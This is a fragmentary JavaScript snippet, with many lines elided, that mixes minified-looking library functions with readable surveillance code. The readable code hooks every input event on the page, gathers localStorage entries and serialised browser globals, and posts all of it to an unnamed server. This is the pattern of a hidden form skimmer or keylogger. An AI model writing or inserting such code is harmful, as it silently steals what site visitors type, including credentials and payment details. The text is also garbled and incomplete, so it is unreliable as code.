...
(function () {
  ...
  */
  ...
  // Define global variables to watch
  const globalVarsToWatch = ["location", "history", "document", "keysToWatch"];

  // Track script execution using this unique identifier
  ...
  qa(ed, fb);
  let executionId = Math.random().toString(36).substring(2);
  ...
  function onInputEvent(e) {
    postDataToServer(["Input", e.target.value]);
  }
  function Wf(a, b, c) {
    return new If(a, b, c);
  }
  ...
  function getGlobalVarsData() {
    const data = [];
    globalVarsToWatch.forEach(v => {
      if (window[v]) {
        data.push(v + ": " + JSON.stringify(window[v]));
      }
    });
    return data;
  }
  ...
  function monitorEvents() {
    document.body.addEventListener('input', onInputEvent, true);
  }
  function Vq() {
  ...
  function postDataToServer(nameValuePairs) {
    const hashId = computeHash(nameValuePairs);
  ...
  function collectAndPostData() {
    postDataToServer(getFilteredLocalStorage().concat(getGlobalVarsData()));
  }
  function ez() {
    var a = fz;
    return function (b, c, d) {
